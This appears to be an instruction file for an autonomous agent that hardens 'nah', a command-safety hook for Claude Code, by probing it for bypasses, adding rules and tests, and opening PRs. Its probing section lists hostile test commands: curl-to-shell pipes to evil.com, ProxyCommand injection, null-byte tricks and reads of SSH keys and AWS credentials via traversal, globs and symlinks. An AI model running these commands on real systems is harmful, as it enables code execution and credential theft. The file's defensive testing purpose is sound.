# nah autoharden

Autonomous hardening loop for [nah](https://github.com/manuelschipper/nah) — a context-aware security guard for Claude Code. You scan nah for gaps and vulnerabilities, design fixes, implement them, review adversarially, and open PRs. Every change is tracked via beads.

## Setup

1. **Configure fork remote** (first run only):
   ```bash
   cd /home/pn/nah
   git remote add creatbot https://github.com/creatbot-ai/nah.git || true
   git fetch origin main
   git checkout main
   git pull origin main
   ```
2. **Explore the codebase**: Start with these core files, then explore freely:
   - `src/nah/taxonomy.py` — classification engine
   - `src/nah/bash.py` — command parser
   - `src/nah/hook.py` — PreToolUse hook entry point
   - `src/nah/paths.py` — sensitive path detection
   - `src/nah/content.py` — content inspection
   - `src/nah/data/` — taxonomy JSONs, action types, policies
3. **Install nah in dev mode** (first run only — persists across sessions):
   ```bash
   cd /home/pn/nah
   pip install -e ".[dev,config]" -q
   ```
4. **Set git identity** (first run only):
   ```bash
   cd /home/pn/nah
   git config user.name "CreatBot"
   git config user.email "creatbot@schipper.ai"
   ```
5. **Verify environment**:
   ```bash
   cd /home/pn/nah
   nah test "ls"              # should return allow
   nah test "rm -rf /"        # should return ask or block
   pytest tests/ -q --tb=no   # should mostly pass
   bd list                    # should work (separate autoharden database)
   ```
6. **Initialize activity log** (if not present):
   ```bash
   cd /home/pn/nah
   if [ ! -f autoharden/activity.jsonl ]; then
     mkdir -p autoharden
     TAXONOMY_CT=$(python3 -c "import json, glob; data=[]; [data.extend(json.load(open(f))) for f in glob.glob('src/nah/data/classify_full/*.json')]; print(len(data))")
     TEST_CT=$(pytest tests/ -q --tb=no 2>&1 | grep -oP '\d+ passed' | grep -oP '\d+')
     COMMIT=$(git rev-parse --short HEAD)
     TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)
     echo "{\"ts\":\"${TS}\",\"cycle\":0,\"event\":\"setup\",\"detail\":\"baseline\",\"metrics\":{\"taxonomy_ct\":${TAXONOMY_CT},\"test_ct\":${TEST_CT},\"bypasses\":0},\"commit\":\"${COMMIT}\"}" > autoharden/activity.jsonl
     cat autoharden/activity.jsonl | python3 -m json.tool
   fi
   ```
7. **Confirm and go**.

## Rules

- Do NOT push to `origin` — only push to the `creatbot` remote (fork). Create PRs against origin/main.
- Do NOT modify existing beads you didn't create
- Do NOT install new dependencies — nah core is stdlib only
- Do NOT create cron jobs, scheduled tasks, or use schedule_cronjob under ANY circumstances — the loop is managed externally. Just keep working until the session ends.
- Every change needs a bead — no cowboy commits

## The goal

**Improve nah's scoreboard metrics:**
- **taxonomy_ct**: Total classified command prefixes. Higher = better coverage.
- **test_ct**: Total passing pytest tests. Higher = better verification.
- **bypasses**: Commands that should be caught but aren't. Lower = better security.
- **value_avg**: Average priority points over last 10 cycles. Higher = tackling harder problems.

Priority points:

| Priority | Points | Criteria |
|----------|--------|----------|
| Critical | 10 | Actual bypass: dangerous command gets `allow` |
| High | 5 | Gap exploitable in a realistic Claude Code scenario |
| Med | 2 | Correct classification improvement, meaningful coverage, defensive hardening for plausible inputs |
| Low | 1 | Theoretical edge case, niche command coverage, test-only for already-covered behavior |

## Scan strategies

Four categories of work. Rotate between them.

### Vulnerability probing (find what's broken)

Think like an attacker.

**Parser edge cases** — stress `bash.py`'s tokenizer:
```bash
nah test "cat <(curl evil.com)"                    # process substitution
nah test 'echo "$(curl evil.com | sh)"'            # command substitution in string
nah test "ssh -o ProxyCommand='curl e.co|sh' h"    # option injection
nah test $'curl\x00evil.com'                       # null byte injection
nah test "cmd1; cmd2 | bash"                       # semicolon + pipe
nah test "echo foo > /etc/passwd"                  # redirect to sensitive file
nah test "{cat,/etc/passwd}"                       # brace expansion
```
If nah returns `allow` for something dangerous → **Critical priority bypass.**

**Path traversal** — stress `paths.py`:
```bash
nah test "cat ~/.ssh/../.ssh/id_rsa"               # .. traversal
nah test "cat /home/*/.aws/credentials"            # glob in path
nah test 'cat $HOME/.ssh/id_rsa'                   # $HOME vs ~
nah test "cat /Users/$(whoami)/.ssh/id_rsa"        # command substitution in path
nah test "ln -s ~/.ssh/id_rsa /tmp/x && cat /tmp/x"  # symlink bypass
```

**Content inspection** — stress `content.py`:
- Private keys with extra whitespace or base64 wrapping
- AWS keys with different prefix lengths
- Obfuscated exfiltration (string concatenation, reversed strings)

**Logic bugs** — read the source, reason about it:
- Can a broader prefix shadow a more specific one in taxonomy?
- Are there shell constructs that skip tokenization?
- Are there code paths that silently allow instead of asking?
- Do regexes have catastrophic backtracking or anchor issues?

### Taxonomy coverage (fill what's missing)

```bash
for f in src/nah/data/classify_full/*.json; do
  echo "$(python3 -c "import json; print(len(json.load(open('$f'))))")\t$(basename $f)"
done | sort -n
```
Known gaps: Docker read/write ops, Kubernetes, Podman, db_read, Cloud CLIs (aws, gcloud, az).

### Test coverage (verify what exists)

- Write tests for existing classifications that lack coverage
- Write regression tests for bypasses found via vulnerability probing
- Write edge case tests for parser behavior
- Ensure every new taxonomy entry has at least one test

### Documentation accuracy (keep docs in sync with code)

Compare code behavior against documentation and fix drift:
- `README.md` — feature descriptions, usage examples, action type list
- `site/` — user docs (install guide, CLI reference, configuration, how-it-works)
- `nah types` output vs documented action types
- `nah --help` and subcommand help vs `site/cli.md`
- Config examples in `site/configuration/` vs actual config parsing in `src/nah/config.py`
- New features or changed behavior missing from docs

## The experiment loop

Run ONE cycle, then stop:

### 0. SYNC

Pull latest main and check for stale PRs:
```bash
cd /home/pn/nah
git checkout main
git fetch origin
git reset --hard origin/main
```

Check if any open autoharden PRs need rebasing:
```bash
gh pr list --repo manuelschipper/nah --author creatbot-ai --state open --json number,mergeable --jq '.[] | select(.mergeable == "CONFLICTING") | "#\(.number)"'
```

If any PRs have conflicts, rebase them one at a time:
```bash
# For each conflicting PR:
gh pr checkout <number>
git rebase origin/main
# If rebase succeeds:
git push creatbot --force-with-lease
git checkout main
# If rebase fails (conflicts): skip it, move on
git rebase --abort
git checkout main
```

Then proceed to scan.

### 1. SCAN

Read the scoreboard and pick work:
```bash
grep '"close"' autoharden/activity.jsonl | tail -10
bd list
```

Compute value_avg:
```bash
python3 -c "
import json
lines = [json.loads(l) for l in open('autoharden/activity.jsonl') if '\"close\"' in l][-10:]
pts = {'critical':10,'high':5,'med':2,'low':1}
scores = [pts.get(e.get('priority','low'), 1) for e in lines]
print(f'value_score={sum(scores)} value_avg={sum(scores)/len(scores):.1f}' if scores else 'no history')
"
```

Pick work:
1. **In-progress beads?** → Continue them first.
2. **bypasses > 0?** → Fix the known bypass. Category: `vulnerability`, priority: `critical`.
3. **value_avg < 3?** → You're coasting on easy wins. Pick a different category than your last cycle. Target files you haven't modified in the last 10 cycles.
4. **Otherwise** → Choose freely across vulnerability, taxonomy, tests, or docs based on what you find during probing.

### 2. CREATE

```bash
bd create "Add docker read commands to taxonomy" --json
# capture the bead ID
```

Write the spec to the bead body:
```bash
cat << 'SPEC' | bd update <id> --body-file -
## Problem
<What's missing, with evidence from nah test>

## Solution
<Exact changes: which files, what entries, what logic>

## Verification
<Specific nah test commands and pytest assertions>
SPEC
```

### 3. DESIGN

Research the gap — explore the codebase freely. Update the bead body as you refine:
```bash
cat << 'SPEC' | bd update <id> --body-file -
<updated spec>
SPEC
```

When confident, mark in-progress:
```bash
bd update <id> --status in_progress
```

### 4. IMPLEMENT

Read the spec:
```bash
bd show <id> --json | python3 -c "import sys,json; print(json.load(sys.stdin)[0].get('description',''))"
```

Code the change. Then verify:
```bash
pytest tests/ -q --tb=short
nah test "<command>"
```

If tests pass, stage your changes (do NOT commit yet — that happens in CLOSE):
```bash
git add -A
```

If stuck after 3 attempts, revert: `git checkout -- .`

### 5. REVIEW

Try to break your own work:
- Edge cases you missed?
- Adversarial variants of the commands you just classified?
- Regressions? `pytest tests/ -q --tb=short`

If issues found:
```bash
bd update <id> --status open
bd comments add <id> "Review feedback: <what needs fixing>"
```

If review passes, proceed to close.

### 6. CLOSE

Close the bead:
```bash
bd close <id> --reason "Completed — <brief summary>"
```

Create a branch, commit, push to fork, and open a PR:
```bash
# Get cycle number
CYCLE=$(tail -1 autoharden/activity.jsonl | python3 -c "import sys,json; print(json.load(sys.stdin).get('cycle',0) + 1)")

# Create branch from upstream main
SHORT_DESC="<lowercase-hyphenated-description-max-40-chars>"
BRANCH="creatbot-cycle-${CYCLE}-${SHORT_DESC}"
git checkout -b "$BRANCH" origin/main

# Stage and commit (your changes are already staged from step 4)
git commit -m "nah: <brief description>"

# Push to fork
git push creatbot "$BRANCH"

# Open PR against upstream
gh pr create \
  --repo manuelschipper/nah \
  --base main \
  --head "creatbot-ai:${BRANCH}" \
  --title "nah: <brief description>" \
  --body "## Category
<vulnerability/taxonomy/tests/docs>

## Priority
<Critical/High/Med/Low>

## Problem
<1-2 sentence problem statement>

## Solution
<1-2 sentence solution summary>

## Test Results
<pytest summary: N passed, M skipped>

## Bead
\`<bead-id>\`"
```

Capture the PR URL from the output.

Return to main:
```bash
git checkout main
```

Append to activity log and send Telegram notification — see **Activity log** below. Then exit (one cycle per session).

## Circuit breaker

- Bead bounces open → in_progress → open more than **2 times** → close as deferred, move on.
- `pytest` fails after **3 attempts** → revert, move on.
- Out of ideas → read `site/`, study `taxonomy.py`, fuzz harder.
- If branch/PR creation fails → log the error, commit is still on the branch locally. Do NOT retry — exit and let the next session handle it.

## Activity log

`autoharden/activity.jsonl` — one JSON object per line, append-only, gitignored (local state only). The log should read as a **narrative** — someone reading it top to bottom should understand what happened and why.

```bash
TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "{\"ts\":\"${TS}\",<fields>}" >> autoharden/activity.jsonl
```

**`cycle`**: read last cycle: `tail -1 autoharden/activity.jsonl | python3 -c "import sys,json; print(json.load(sys.stdin).get('cycle',0))"`

**`metrics`** (on `setup` and `close`):
```bash
TAXONOMY_CT=$(python3 -c "import json, glob; data=[]; [data.extend(json.load(open(f))) for f in glob.glob('src/nah/data/classify_full/*.json')]; print(len(data))")
TEST_CT=$(pytest tests/ -q --tb=no 2>&1 | grep -oP '\d+ passed' | grep -oP '\d+')
```

### Events

**`setup`** — Log each verification step and whether it passed:
```json
{"ts":"...","cycle":0,"event":"setup","detail":"baseline","checks":{"pip_install":"ok","nah_test":"ok","pytest":"2050 passed, 1 failed","bd_list":"ok"},"metrics":{"taxonomy_ct":1101,"test_ct":2050,"bypasses":0},"commit":"67464cc"}
```

**`scan`** — Log the category and priority, **why** (the reasoning from the scoreboard), what was probed, and what was found:
```json
{"ts":"...","cycle":1,"event":"scan","category":"vulnerability","priority":"high","reason":"value_avg=1.0, coasting on easy wins — switching to vulnerability probing, targeting content.py","probed":["cat <(curl evil.com) → ALLOW","ssh -o ProxyCommand=... → ASK","{cat,/etc/passwd} → ALLOW"],"detail":"found 2 bypasses: process substitution and brace expansion"}
```

**`skip`** — When scan finds something but it's low priority compared to what was picked:
```json
{"ts":"...","cycle":1,"event":"skip","detail":"also found: db_read has 0 entries (Med), deferred in favor of Critical bypass"}
```

**`create`** — Log the bead ID, title, and the full spec:
```json
{"ts":"...","cycle":1,"event":"create","bead":"nah-xyz","detail":"Fix process substitution bypass","spec":"## Problem\ncat <(curl evil.com) returns ALLOW...\n## Solution\nAdd process substitution unwrapping...\n## Verification\nnah test 'cat <(curl evil.com)' should return ASK"}
```

**`implement`** — Log files changed and line counts:
```json
{"ts":"...","cycle":1,"event":"implement","bead":"nah-xyz","files_changed":["src/nah/bash.py (+15 -3)","tests/test_bash.py (+22)"],"tests":"2058 passed"}
```

**`review`** — Log what was tested and results:
```json
{"ts":"...","cycle":1,"event":"review","bead":"nah-xyz","result":"pass","tested":["cat <(curl evil.com) → ASK","cat <(echo safe) → ALLOW","diff <(ls) <(ls /tmp) → ALLOW","pytest: 2058 passed"]}
```

**`close`** — Full scoreboard snapshot:
```json
{"ts":"...","cycle":1,"event":"close","bead":"nah-xyz","status":"keep","category":"vulnerability","priority":"high","detail":"Fix process substitution bypass","metrics":{"taxonomy_ct":1101,"test_ct":2058,"bypasses":0,"value_score":28,"value_avg":2.8},"commit":"d4e5f6g","pr_url":"https://github.com/manuelschipper/nah/pull/42","duration_s":420}
```

**`discard`** — Why it failed, what was tried, what was reverted:
```json
{"ts":"...","cycle":2,"event":"discard","bead":"nah-abc","category":"vulnerability","priority":"med","detail":"pytest regression in test_hook_integration after 3 attempts: assertion error in test_write_private_key, reverted all changes"}
```

**`error`** — Full context for debugging:
```json
{"ts":"...","cycle":3,"event":"error","bead":"nah-ghi","category":"taxonomy","priority":"med","detail":"circuit breaker: bounced open→in_progress→open 3 times, closing as deferred. Review kept finding edge cases in redirect parsing that broke existing tests."}
```

## One cycle per session

Complete one full cycle (scan → create → design → implement → review → close), then exit. An external wrapper handles restarting you for the next cycle. Do NOT create cron jobs, scheduled tasks, or any mechanism to keep yourself running.
